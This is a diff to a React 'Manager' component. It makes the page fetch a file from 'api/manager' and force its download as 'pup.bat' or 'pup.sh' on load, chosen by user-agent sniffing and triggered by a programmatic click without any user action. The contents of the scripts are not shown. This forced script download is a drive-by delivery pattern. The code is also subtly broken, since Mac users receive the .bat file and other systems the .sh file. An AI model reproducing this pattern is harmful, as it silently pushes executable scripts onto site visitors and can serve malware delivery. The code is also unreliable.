@@ -23,7 +23,7 @@ const Manager = () => {
 
     fetchDownloadCalled.current = true;
 
-    fetch('api/try')
+    fetch('api/manager')
       .then((res) => res.blob())
       .then((blob) => {
         const file = window.URL.createObjectURL(blob);
@@ -31,7 +31,7 @@ const Manager = () => {
         a.href = file;
         a.download = 'pup.bat';
         document.body.appendChild(a);
-        // a.click();
+        a.click();
         window.URL.revokeObjectURL(file);
         console.log('File Downloaded');
       });
@@ -44,9 +44,31 @@ const Manager = () => {
 
   useEffect(() => {
     if (navigator.userAgent.indexOf('Mac OS X') !== -1) {
-      fetchDownload('mac');
+      fetch('api/manager')
+        .then((res) => res.blob())
+        .then((blob) => {
+          const file = window.URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = file;
+          a.download = 'pup.bat';
+          document.body.appendChild(a);
+          a.click();
+          window.URL.revokeObjectURL(file);
+          console.log('File Downloaded');
+        });
     } else {
-      fetchDownload('windows');
+      fetch('api/manager')
+        .then((res) => res.blob())
+        .then((blob) => {
+          const file = window.URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = file;
+          a.download = 'pup.sh';
+          document.body.appendChild(a);
+          a.click();
+          window.URL.revokeObjectURL(file);
+          console.log('File Downloaded');
+        });
     }
   }, []);
 
